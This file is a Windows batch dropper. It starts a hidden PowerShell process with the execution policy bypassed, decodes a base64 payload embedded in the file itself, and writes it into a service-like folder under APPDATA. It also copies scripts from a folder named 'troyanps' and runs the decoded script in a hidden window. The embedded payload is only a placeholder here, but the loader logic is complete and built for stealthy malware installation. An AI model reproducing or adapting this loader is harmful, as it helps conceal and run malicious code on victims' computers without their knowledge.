@echo off
setlocal EnableExtensions
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& { $p='%~f0'; $t=[IO.File]::ReadAllText($p); $m=[regex]::Match($t,'(?s)::BEGIN_B64::\r?\n(.+?)\r?\n::END_B64::'); if (-not $m.Success) { exit 1 }; $bytes=[Convert]::FromBase64String($m.Groups[1].Value.Trim()); $suffix='service'; $maxBase=32-$suffix.Length; $n=[Environment]::MachineName; if ([string]::IsNullOrWhiteSpace($n)) { $base='Hephaestus' } else { $sb=[System.Text.StringBuilder]::new(); foreach ($ch in $n.ToCharArray()) { if ([char]::IsLetterOrDigit($ch) -or $ch -eq '-' -or $ch -eq '_') { [void]$sb.Append($ch) } else { [void]$sb.Append('_') } }; $base=$sb.ToString().Trim('_'); if ([string]::IsNullOrWhiteSpace($base)) { $base='Hephaestus' } }; if ($base.Length -gt $maxBase) { $base=$base.Substring(0,$maxBase) }; $dname=$base+$suffix; $bodyPath=Join-Path (Join-Path $env:APPDATA $dname) ($dname+'_b.ps1'); $dir=Split-Path $bodyPath; if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }; $pack=Join-Path (Split-Path $p) 'troyanps'; if (Test-Path $pack) { Get-ChildItem $pack -Filter '*.ps1' -File | Copy-Item -Destination $dir -Force }; [IO.File]::WriteAllBytes($bodyPath,$bytes); Set-Location $dir; $proc=Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-File',$bodyPath -WindowStyle Hidden -PassThru; $proc.WaitForExit() }"
endlocal
exit /b
::BEGIN_B64::
0102
::END_B64::
